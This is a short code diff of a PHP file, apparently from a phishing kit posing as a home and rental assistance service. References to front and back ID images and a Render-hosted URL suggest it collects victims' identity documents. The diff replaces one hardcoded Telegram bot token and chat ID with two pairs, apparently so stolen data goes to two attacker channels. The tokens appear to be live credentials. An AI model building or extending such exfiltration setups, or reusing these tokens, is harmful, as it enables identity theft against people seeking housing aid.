@@ -81,8 +81,13 @@ $front_id, $back_id
 // ======================
 // TELEGRAM BOT SETUP
 // ======================
-$botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
-$chatId = "6513265609";
+// Telegram Bot 1
+$bot1 = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
+$chat1 = "6513265609";
+
+// Telegram Bot 2
+$bot2 = "8972396935:AAG1WwV6vzEE5xkZty67SrE2GRYOO3HR8F0";
+$chat2 = "5469294503";
 
 // 🔥 YOUR REAL RENDER URL
 $baseUrl = "https://homeandrentalassistance.onrender.com";
